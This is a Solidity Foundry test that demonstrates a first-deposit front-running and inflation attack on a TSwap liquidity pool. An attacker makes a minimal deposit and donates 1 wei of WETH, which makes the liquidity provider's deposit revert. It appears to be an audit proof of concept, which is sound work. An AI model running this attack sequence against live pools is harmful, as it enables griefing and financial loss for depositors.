// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { TSwapPool } from "../../src/PoolFactory.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract TSwapPoolTest is Test {
    TSwapPool pool;
    ERC20Mock poolToken;
    ERC20Mock weth;

    address liquidityProvider = makeAddr("liquidityProvider");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        poolToken = new ERC20Mock();
        weth = new ERC20Mock();
        pool = new TSwapPool(address(poolToken), address(weth), "LTokenA", "LA");

        weth.mint(liquidityProvider, 200e18);
        poolToken.mint(liquidityProvider, 200e18);

        weth.mint(user, 200e18);
        poolToken.mint(user, 200e18);

        weth.mint(attacker, 200e18);
        poolToken.mint(attacker, 200e18);
    }

    function testFrontRunFirstDeposit() public {
        // attacker front run the initial deposit
        vm.startPrank(attacker);
        weth.approve(address(pool), 200e18);
        poolToken.approve(address(pool), 200e18);

        // deposit minimum amount, this does not matter
        pool.deposit(1e9, 1e9, 1e9, uint64(block.timestamp));

        /*
        donate weth to the pool (inflation attack)
        we want to break this formula
        liquidityTokensToMint =
            (wethToDeposit * pool.totalLiquidityTokenSupply()) /
            wethReserves;
        */
        weth.transfer(address(pool), 1);

        // initial liquidit provider is now trying to deposit
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        bytes memory errorData = abi.encodeWithSelector(
            TSwapPool.TSwapPool__MinLiquidityTokensToMintTooLow.selector,
            100e18,
            99999999900000000099
        );
        vm.expectRevert(errorData);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
    }
}
